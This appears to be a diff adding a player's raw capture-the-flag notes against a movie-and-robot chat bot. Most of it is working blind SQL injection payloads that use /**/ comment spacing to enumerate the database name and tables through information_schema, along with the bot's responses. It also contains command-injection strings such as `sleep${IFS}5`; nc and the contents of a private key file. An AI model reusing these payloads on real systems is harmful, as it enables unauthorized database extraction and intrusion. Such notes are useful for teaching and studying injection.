@@ -1,0 +1,60 @@
+Database name: bot
+two tables:
+	movies: 2 columns
+		id
+		title
+	actors: 3 columns
+		id
+		name
+		movie
+
+/var/private/key.txt
+	length 65 characters
+	58c63d3625b948b10a897371f0e656455a78e235db5690e2d1bbf23a1883d4ec
+
+
+
+
+there seems to be a 30 character limit on movie names and robot names.
+
+search:
+	_ is a wild card for one character
+	% is a wild card for multiple characters
+	^ is escape?
+	\ is escape?
+	\\ is \
+
+
+details:
+	responds funny with ' and ''
+	'""'
+	details 152'/**/'
+
+details 7'/**/and/**/exists(select/**/1/**/from/**/dual/**/where/**/database()/**/like/**/'%b%')and/**/''='
+Firefly: `sleep${IFS}5`; nc; ls; ls; tester; (41 total)
+details 7'/**/and/**/exists(select/**/1/**/from/**/dual/**/where/**/database()/**/like/**/'%c%')and/**/''='
+Firefly: `sleep${IFS}5`; nc; ls; ls; tester; (0 total)
+
+
+bot
+
+details 7'/**/and/**/exists(select/**/1/**/from/**/dual/**/where/**/database()/**/=/**/'bot')and/**/''='
+lib1
+Firefly: `sleep${IFS}5`; nc; ls; ls; tester; (41 total)
+
+
+'/**/and/**/    /**/and/**/''='
+
+select * from robots inner join movies on movies.id=robots.movie_id where movie_id = '1' limit 3
+
+select (select count(*) from information_schema.tables where table_schema = 'robots') = 2
+((select count(*) from information_schema.tables where table_schema = 'robots') = 2)
+'/**/and/**/((select count(*) from information_schema.tables where table_schema = 'robots') = 2)/**/and/**/''='
+select * from robots inner join movies on movies.id=robots.movie_id where movie_id = '1'/**/and/**/((select count(*) from information_schema.tables where table_schema = 'robots') = 2)/**/and/**/''='' limit 3
+select * from robots inner join movies on movies.id=robots.movie_id where movie_id = '1'/**/and/**/((select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/'robots')/**/=/**/2)/**/and/**/''='' limit 3
+details 7'/**/and/**/((select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/'bot')/**/=/**/2)/**/and/**/''='
+Firefly: fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; test; test; (46 total) => TWO TABLES
+
+details 7'/**/and/**/(select/**/count(TABLE_NAME)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/'bot'/**/and/**/table_name/**/like/**/'movies')/**/=/**/1/**/and/**/''='
+lib1
+Firefly: fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; test; test; (46 total) => one named movies
